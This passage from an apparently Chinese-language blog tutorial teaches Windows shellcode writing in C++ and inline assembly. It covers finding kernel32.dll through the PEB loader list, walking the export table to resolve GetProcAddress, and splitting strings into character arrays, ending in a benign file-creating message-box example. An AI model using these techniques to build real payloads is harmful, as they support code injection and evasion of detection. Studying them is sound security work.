class="comment">//从LDR中获取InMemoryOrderModuleList.Flink的地址(入口1，属于主进程)</span></span><br><span class="line">        MOV EBX, [EBX] <span class="comment">//从InMemoryOrderModuleList.Flink取得InMemoryOrderModuleList.Flink.Flink的地址(入口2，属于ntdll.dll)</span></span><br><span class="line">        MOV EBX, [EBX] <span class="comment">//同上，取得InMemoryOrderModuleList.Flink.Flink.Flink的地址(入口3，属于kernel32.dll)</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">10</span>H] <span class="comment">//通过InMemoryOrderModuleList.Flink.Flink.Flink提供的_LDR_DATA_TABLE_ENTRY，再从中最终获取入口3的基址，也就是kernel32.dll的基址了</span></span><br><span class="line">        XCHG EAX, EBX<span class="comment">// 此过程的返回kernel32.dll的基址，存于EAX寄存器中</span></span><br><span class="line">        RETN</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hLoadLibraryA = (HMODULE)getKernel32();<span class="comment">//将获取到的基址传给hLoadLibraryA</span></span><br><span class="line"><span class="comment">//由于没办法直接使用printf函数，这边还是用上面的方法来动态调</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(__CRTDECL* FN_printf)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        _In_z_ _Printf_format_string_ <span class="keyword">char</span> <span class="keyword">const</span>* <span class="keyword">const</span> _Format,</span></span></span><br><span class="line"><span class="function"><span class="params">        ...)</span></span>;</span><br><span class="line">    FN_printf fn_printf;</span><br><span class="line">    fn_printf = (FN_printf)GetProcAddress(LoadLibraryA(<span class="string">&quot;msvcrt.dll&quot;</span>), <span class="string">&quot;printf&quot;</span>);</span><br><span class="line"><span class="comment">//对比两个函数的地址</span></span><br><span class="line">    fn_printf(<span class="string">&quot;0x%08X\n&quot;</span>, hLoadLibraryA);</span><br><span class="line">    fn_printf(<span class="string">&quot;0x%08X\n&quot;</span>, LoadLibraryA(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到返回的结果是一模一样的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/39.png?raw=true" alt="image-20200419155111509"></p><p>备注：</p><ul><li><p><code>__declspec(naked)</code>是用来告诉编译器函数代码的汇编语言为自己的所写，不需要编译器添加任何汇编代码</p></li><li><p>上面的汇编使用的是<strong>MASM</strong>版本，<strong>NASM</strong>版本代码如下，根据系统使用不同的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked)<span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        XCHG EAX, EBX</span><br><span class="line">        MOV EBX, FS: [<span class="number">30</span>H]                <span class="comment">//从TIB(Thread Information Block)中取得PEB(Process Environment Block)的地址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">0</span>CH]               <span class="comment">//从PEB中取得LDR类的基址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">14</span>H]               <span class="comment">//从LDR中获取InMemoryOrderModuleList.Flink的地址(入口1，属于主进程)</span></span><br><span class="line">        MOV EBX, [EBX]                   <span class="comment">//从InMemoryOrderModuleList.Flink取得InMemoryOrderModuleList.Flink.Flink的地址(入口2，属于ntdll.dll)</span></span><br><span class="line">        MOV EBX, [EBX]                   <span class="comment">//同上，取得InMemoryOrderModuleList.Flink.Flink.Flink的地址(入口3，属于kernel32.dll)</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">10</span>H]               <span class="comment">//通过InMemoryOrderModuleList.Flink.Flink.Flink提供的_LDR_DATA_TABLE_ENTRY，再从中最终获取入口3的基址，也就是kernel32.dll的基址了</span></span><br><span class="line">        XCHG EAX, EBX                    <span class="comment">//此过程的返回kernel32.dll的基址，存于EAX寄存器中</span></span><br><span class="line">        RETN</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上面注释中说的入口点，不同程序不同的入口点如下</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/40.png?raw=true" alt="image-20200419161011535"></p></li></ul><h5 id="获取kernel32-dll中的函数"><a href="#获取kernel32-dll中的函数" class="headerlink" title="获取kernel32.dll中的函数"></a>获取kernel32.dll中的函数</h5><p>有了<strong>kernel32.dll</strong>基址后，我们可以通过基址来获取到里面需要用到API函数</p><p>依旧直接贴代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:MyMain&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">__declspec(naked)<span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        XCHG EAX, EBX</span><br><span class="line">        MOV EBX, FS:[<span class="number">30</span>H] <span class="comment">//从TIB(Thread Information Block)中取得PEB(Process Environment Block)的地址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">0</span>CH] <span class="comment">//从PEB中取得LDR类的基址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">14</span>H] <span class="comment">//从LDR中获取InMemoryOrderModuleList.Flink的地址(入口1，属于主进程)</span></span><br><span class="line">        MOV EBX, [EBX] <span class="comment">//从InMemoryOrderModuleList.Flink取得InMemoryOrderModuleList.Flink.Flink的地址(入口2，属于ntdll.dll)</span></span><br><span class="line">        MOV EBX, [EBX] <span class="comment">//同上，取得InMemoryOrderModuleList.Flink.Flink.Flink的地址(入口3，属于kernel32.dll)</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">10</span>H] <span class="comment">//通过InMemoryOrderModuleList.Flink.Flink.Flink提供的_LDR_DATA_TABLE_ENTRY，再从中最终获取入口3的基址，也就是kernel32.dll的基址了</span></span><br><span class="line">        XCHG EAX, EBX<span class="comment">// 此过程的返回kernel32.dll的基址，存于EAX寄存器中</span></span><br><span class="line">        RETN</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FARPROC _GetProcAddress(HMODULE hModuleBase<span class="comment">/*句柄模块*/</span>)</span><br><span class="line">&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;</span><br><span class="line">    PIMAGE_NT_HEADERS32 lpNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (!lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    PDWORD lpdwFunName = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNames);</span><br><span class="line">    PWORD lpword = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNameOrdinals);</span><br><span class="line">    PDWORD lpdwFunAddr = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfFunctions);</span><br><span class="line"></span><br><span class="line">    DWORD dwLoop = <span class="number">0</span>;</span><br><span class="line">    FARPROC pRet = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (; dwLoop &lt;= lpExports-&gt;NumberOfNames - <span class="number">1</span>; dwLoop++) &#123;</span><br><span class="line">        <span class="keyword">char</span>* pFunName = (<span class="keyword">char</span>*)(lpdwFunName[dwLoop] + (DWORD)hModuleBase);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pFunName[<span class="number">0</span>] == <span class="string">&#x27;G&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">3</span>] == <span class="string">&#x27;P&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">4</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">5</span>] == <span class="string">&#x27;o&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">6</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">7</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">8</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">9</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">10</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">11</span>] == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">12</span>] == <span class="string">&#x27;s&#x27;</span> &amp;&amp;</span><br><span class="line">            pFunName[<span class="number">13</span>] == <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pRet = (FARPROC)(lpdwFunAddr[lpword[dwLoop]] + (DWORD)hModuleBase);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hLoadLibraryA = (HMODULE)getKernel32();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(__CRTDECL* FN_printf)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        _In_z_ _Printf_format_string_ <span class="keyword">char</span> <span class="keyword">const</span>* <span class="keyword">const</span> _Format,</span></span></span><br><span class="line"><span class="function"><span class="params">        ...)</span></span>;</span><br><span class="line">    FN_printf fn_printf;</span><br><span class="line">    fn_printf = (FN_printf)GetProcAddress(LoadLibraryA(<span class="string">&quot;msvcrt.dll&quot;</span>), <span class="string">&quot;printf&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明定义，先转到到原函数定义，然后重新定义</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* FN_GetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        _In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">        _In_ LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line"></span><br><span class="line">    FN_GetProcAddress fn_GetProcAddress;</span><br><span class="line">    fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hLoadLibraryA);</span><br><span class="line"></span><br><span class="line">    fn_printf(<span class="string">&quot;0x%xn\n&quot;</span>, fn_GetProcAddress);</span><br><span class="line">    fn_printf(<span class="string">&quot;0x%xn\n&quot;</span>, GetProcAddress);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下图的结果，说明代码没错</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/41.png?raw=true" alt="image-20200419165857971"></p><p>上面代码的流程，首先获取<strong>kernel32.dll</strong>的基址，然后利用<strong>typedef</strong>来声明动态调用，接着调用写好的<code>_GetProcAddress</code>函数来把地址负责给声明好的<code>fn_GetProcAddress</code>中，接着我们直接使用<code>fn_GetProcAddress</code>函数就和调用windows api一样的。</p><p>备注：</p><ul><li><code>_GetProcAddress</code>函数的写法涉及到PE结构编写，后面有时间会单独写一篇相关的文章</li></ul><h4 id="禁止使用全局变量"><a href="#禁止使用全局变量" class="headerlink" title="禁止使用全局变量"></a>禁止使用全局变量</h4><p>因为全局变量在使用vs平台进行编译的时候会加载到PE结构中的特定区段中，类似于使用了绝对地址，这样是我们写shellcode的时候需要避免的。</p><p>备注：<code>static</code>关键字也是一样的，需要避免</p><h4 id="确保加载所需要的动态链接库"><a href="#确保加载所需要的动态链接库" class="headerlink" title="确保加载所需要的动态链接库"></a>确保加载所需要的动态链接库</h4><p>在上面的<code>printf</code>函数中我们也是使用动态调用的方式来实现的，所以在使用非自己写的函数的时候都必须确保加载了所需要的动态链接库！！！！！</p><h2 id="编写我们第一个shellcode"><a href="#编写我们第一个shellcode" class="headerlink" title="编写我们第一个shellcode"></a>编写我们第一个shellcode</h2><p>我们普通的代码写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">CreateFileA(&quot;1.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);</span><br><span class="line">MessageBoxA(NULL, &quot;hello world&quot;, tip, MB_OK);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shellcode写法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/entry:MyMain&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">FARPROC _GetProcAddress(HMODULE hModuleBase);</span><br><span class="line"><span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//声明定义GetProcAddress</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* FN_GetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        _In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">        _In_ LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取GetProcAddress真实地址</span></span><br><span class="line">    FN_GetProcAddress fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress((HMODULE)getKernel32());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明定义CreateFileA</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* FN_CreateFileA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __in     LPCSTR lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in     DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in     DWORD dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in     DWORD dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in     DWORD dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in_opt HANDLE hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line">    <span class="comment">//将来的替换，地址全部动态获取</span></span><br><span class="line">    <span class="comment">//FN_CreateFileA fn_CreateFileA = (FN_CreateFileA)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;), &quot;CreateFileA&quot;);</span></span><br><span class="line">    <span class="comment">//带引号的字符串打散处理</span></span><br><span class="line">    <span class="keyword">char</span> xyCreateFile[] = &#123; <span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//动态获取CreateFile的地址</span></span><br><span class="line">    FN_CreateFileA fn_CreateFileA = (FN_CreateFileA)fn_GetProcAddress((HMODULE)getKernel32(), xyCreateFile);</span><br><span class="line">    <span class="keyword">char</span> xyNewFile[] = &#123; <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    fn_CreateFileA(xyNewFile, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义LoadLibraryA</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* FN_LoadLibraryA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __in LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line">    <span class="keyword">char</span> xyLoadLibraryA[] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//动态获取LoadLibraryA的地址</span></span><br><span class="line">    FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress((HMODULE)getKernel32(), xyLoadLibraryA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义MessageBoxA</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* FN_MessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        __in_opt HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in_opt LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in_opt LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">        __in UINT uType)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//原来的：MessageBoxA(NULL, &quot;Hello world&quot;, &quot;tip&quot;, MB_OK);</span></span><br><span class="line">    <span class="keyword">char</span> xy_user32[] = &#123; <span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> xy_MessageBoxA[] = &#123; <span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(xy_user32), xy_MessageBoxA);</span><br><span class="line">    <span class="keyword">char</span> xy_Hello[] = &#123; <span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> xy_tip[] = &#123; <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;p&#x27;</span> &#125;;</span><br><span class="line">    fn_MessageBoxA(<span class="literal">NULL</span>, xy_Hello, xy_tip, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__declspec(naked)<span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        XCHG EAX, EBX</span><br><span class="line">        MOV EBX, FS: [<span class="number">30</span>H] <span class="comment">//从TIB(Thread Information Block)中取得PEB(Process Environment Block)的地址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">0</span>CH] <span class="comment">//从PEB中取得LDR类的基址</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">14</span>H] <span class="comment">//从LDR中获取InMemoryOrderModuleList.Flink的地址(入口1，属于主进程)</span></span><br><span class="line">        MOV EBX, [EBX] <span class="comment">//从InMemoryOrderModuleList.Flink取得InMemoryOrderModuleList.Flink.Flink的地址(入口2，属于ntdll.dll)</span></span><br><span class="line">        MOV EBX, [EBX] <span class="comment">//同上，取得InMemoryOrderModuleList.Flink.Flink.Flink的地址(入口3，属于kernel32.dll)</span></span><br><span class="line">        MOV EBX, [EBX + <span class="number">10</span>H] <span class="comment">//通过InMemoryOrderModuleList.Flink.Flink.Flink提供的_LDR_DATA_TABLE_ENTRY，再从中最终获取入口3的基址，也就是kernel32.dll的基址了</span></span><br><span class="line">        XCHG EAX, EBX<span class="comment">// 此过程的返回kernel32.dll的基址，存于EAX寄存器中</span></span><br><span class="line">        RETN</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FARPROC _GetProcAddress(HMODULE hModuleBase)</span><br><span class="line">&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;</span><br><span class="line">    PIMAGE_NT_HEADERS32 lpNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> 